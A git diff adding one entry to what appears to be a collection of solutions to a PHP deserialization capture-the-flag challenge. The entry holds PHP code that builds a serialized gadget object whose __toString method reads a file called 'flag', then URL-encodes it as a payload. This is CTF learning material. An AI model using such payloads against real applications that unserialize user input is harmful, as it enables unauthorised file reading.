@@ -320,8 +320,50 @@ echo base64_encode(serialize($user));
 
 - [Source Code](https://github.com/HeavyGhost-le/PHP_deserialization_web_chall.git)
 
+--------------
+
+### Jmoraissec
+
 ---------------
 
+- Pop chain-:
+
+```php
+<?php
+
+Class _Text
+{
+	private $filename;
+
+	public function __construct($filename)
+  {
+    $this->filename = "";
+  }
+
+	public function __toString()
+	{
+		$path = "./" . trim($this->filename) . ".txt";
+      if (file_exists($path))
+        echo file_get_contents($path);
+  }
+}
+
+$gadgetfilename = new _Text("flag");
+
+$filename = new _Text("flag");
+$reflection = new ReflectionClass($gadgetfilename);
+$property = $reflection->getProperty("filename");
+$property->setAccessible(true);
+$property->setValue($filename,"flag");
+
+echo urlencode(serialize($filename));
+
+?>
+```
+
+-  [Source Code](https://github.com/jmoraissec/ctf-insecure-deserialization)
+
+----------------
 ### Sauce
 
 --------------
